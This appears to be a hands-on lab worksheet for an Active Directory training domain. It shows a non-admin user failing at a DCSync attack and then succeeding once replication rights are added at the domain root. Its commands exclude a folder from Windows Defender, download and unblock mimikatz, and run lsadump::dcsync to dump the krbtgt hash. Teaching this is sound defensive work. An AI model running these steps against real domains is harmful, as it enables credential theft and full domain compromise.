

# Exercise 4: DCSync Attack & Targeted Permissions

> **Worksheet Task:**
> * Try to perform DCSync with a non-admin user.
> * After failure, modify only the specific permission in the specific place to 
>   succeed in the process.

**Objective:** Attempt a DCSync attack using a non-privileged user, observe the
failure, and then grant the specific AD permissions required to successfully
dump credentials without assigning Domain Admin rights.

### 4.1 Prepare a Standard User and Testing Tools
We will create a standard user and set up the environment to download our
credential extraction tool.

1. On `DC01`, open PowerShell as Administrator and create the enabled user with
   a compliant password:
   ```powershell
   $Password = ConvertTo-SecureString "passW12!" -AsPlainText -Force
   New-ADUser -Name "SyncUser" -GivenName "Sync" -Surname "User" -SamAccountName "syncuser" -AccountPassword $Password -Enabled $true

   ```

2. On the testing endpoint (`win-pc-1`), open PowerShell as Administrator to
prepare the environment, exclude it from Defender, and download the tool:
```powershell
# 1. Create a dedicated tools directory
$TargetDir = "C:\Tools"
New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null

# 2. Exclude the directory from Windows Defender to prevent blocking
Add-MpPreference -ExclusionPath $TargetDir

# 3. Force TLS 1.2 for the download session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 4. Download the executable (Using the 'raw' URL to avoid HTML download)
$DownloadUrl = "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
$ExePath = "$TargetDir\mimikatz.exe"

Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing

# 5. Unblock the downloaded file
Unblock-File -Path $ExePath

```


3. **Important Defender Note:** If Windows Defender still intercepts the file
upon execution (returning an `Access is denied` error in the terminal),
open **Windows Security > Protection history**, locate the blocked threat,
click **Actions**, and select **Allow on device**.

### 4.2 Attempt DCSync as a Non-Admin (Failure)

*Note: You do not need to sign out of Windows. The `runas` command spawns a
shell under the security context of `syncuser`, ensuring all subsequent
network calls authenticate as that user.*

*Troubleshooting Connection:* If `runas` fails with error `1311: We can't sign  you in with this credential because your domain isn't available`, ensure `DC01`
is powered on and `win-pc-1` can reach it (e.g., via `ping corp.local`).

1. On the endpoint (`win-pc-1`), open a command prompt and switch execution
context:
```cmd
runas /user:corp\syncuser cmd

```


*(Enter the password: passW12!)*
2. In the new Command Prompt window (running as syncuser), navigate to the
tools folder and execute the tool to attempt DCSync on the `krbtgt` account:
```cmd
cd C:\Tools
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

```


3. **Result:** The command will fail with an error similar to
`ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)`,
indicating insufficient rights.

### 4.3 Modify Specific Permissions (The "Specific Place")

To allow DCSync, we must grant Replicating Directory rights at the root of
the domain.

1. On `DC01`, open **Active Directory Users and Computers** (`dsa.msc`).
2. Click **View** in the top menu and ensure **Advanced Features** is checked.
3. Right-click the domain root (`corp.local`) and select **Properties**.
4. Go to the **Security** tab and click **Advanced**.
5. Click **Add**, then click **Select a principal**.
6. Type `syncuser` and click OK.
7. In the Permissions Entry window, ensure "Apply to" is set to **This object
and all descendant objects**.
8. Scroll down the permissions list and check the boxes for EXACTLY these
two permissions:
* **Replicating Directory Changes**
* **Replicating Directory Changes All**


9. Click **OK** three times to save and close the properties.

### 4.4 Attempt DCSync Again (Success)

1. Return to the endpoint (`win-pc-1`) to the command prompt running as
`syncuser`.
2. Execute the DCSync command again from the tools directory:
```cmd
cd C:\Tools
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

```


3. **Result:** The attack will now succeed, dumping the NTLM hash of the
krbtgt account (or any other specified user) to the screen, demonstrating
that Domain Admin rights are not strictly necessary to compromise AD
credentials.

